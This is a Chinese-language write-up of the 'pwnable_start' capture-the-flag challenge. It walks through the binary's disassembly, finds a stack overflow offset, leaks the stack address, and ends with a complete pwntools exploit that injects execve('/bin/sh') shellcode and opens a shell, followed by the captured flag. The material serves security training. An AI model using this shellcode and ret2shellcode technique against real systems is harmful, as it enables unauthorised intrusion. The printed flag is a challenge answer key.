# pwnable_start

[题目地址](https://buuoj.cn/challenges#pwnable_start)

关于汇编pwn的start。

```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

这题的伪代码根本看不了，只能看汇编。

```
        08048060 54              PUSH       ESP=>local_4
        08048061 68 9d 80        PUSH       _exit
                 04 08
        08048066 31 c0           XOR        EAX,EAX
        08048068 31 db           XOR        EBX,EBX
        0804806a 31 c9           XOR        ECX,ECX
        0804806c 31 d2           XOR        EDX,EDX
        0804806e 68 43 54        PUSH       0x3a465443
                 46 3a
        08048073 68 74 68        PUSH       0x20656874
                 65 20
        08048078 68 61 72        PUSH       0x20747261
                 74 20
        0804807d 68 73 20        PUSH       0x74732073
                 73 74
        08048082 68 4c 65        PUSH       0x2774654c
                 74 27
        08048087 89 e1           MOV        ECX,ESP
        08048089 b2 14           MOV        DL,0x14
        0804808b b3 01           MOV        BL,0x1
        0804808d b0 04           MOV        AL,0x4
        0804808f cd 80           INT        0x80
        08048091 31 db           XOR        EBX,EBX
        08048093 b2 3c           MOV        DL,0x3c
        08048095 b0 03           MOV        AL,0x3
        08048097 cd 80           INT        0x80
        08048099 83 c4 14        ADD        ESP,0x14
        0804809c c3              RET
```

发现int 0x80，这不是32位的[系统调用](https://blog.csdn.net/xiaominthere/article/details/17287965)吗？第一个0x80前eax（al就是eax的低位，同理dl是edx的低位，bl是ebx的低位）是0x4，对应着是write；第二个0x80前eax是0x3，就是read了。这题一个让我纠结的一点是调用的read把我的输入存在哪了。理论上ecx里是第二个参数也就是存储的缓冲区，然而第二个0x80前根本就没动过ecx，唯一可能的地方只能是之前的`MOV        ECX,ESP`了。这么看来是把输入存到esp对应的地方了，问题是咱也不知道那个地方多大，读进去0x3c大小会不会溢出导致rop。那就调试吧，用pwntools自带的[cyclic](https://ch4r1l3.github.io/2018/07/19/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E5%9B%9B%E7%AB%A0%E2%80%94%E2%80%94pwntools%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/)函数找偏移。具体操作就是本地运行程序并开启gdb，在返回处下一个断点，发送cyclic生成的payload后查看eip变成了啥，再用cyclic_find就能找到偏移了。最后发现是0x14。

然后想想怎么getshell。最开始checksec能发现啥也没开，那ret2shellcode不错。构造payload`b'a'*0x14+ret_addr+b'b'*0x14`进行调试，发现b出现的位置固定在esp地址偏移0x14的位置，意味着我们ret_addr填`esp+0x14`就能返回到shellcode的位置。

如何泄露esp地址？我们输入0x14个a填充，返回地址填0x08048087。因为这里有一句`MOV        ECX,ESP`，接下来执行0x80时就会调用write把esp的值打印出来。接下来还有一个read，该利用这次rop getshell了。直接把刚刚调试的payload改一下，`b'a'*0x14+(esp+0x14)+shellcode`。

```python
from pwn import *
p = remote("node4.buuoj.cn",25855)
ret_addr = 0x08048087
payload = b"a" * 0x14 + p32(ret_addr)
p.sendafter(":",payload)
esp = u32(p.recv(4))
shellcode=b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
payload= b'a' * 0x14 + p32(esp + 0x14) + shellcode
p.send(payload)
p.interactive()
```

## Flag
> flag{6d8d4d06-d98a-47ef-9306-9896228bab1c}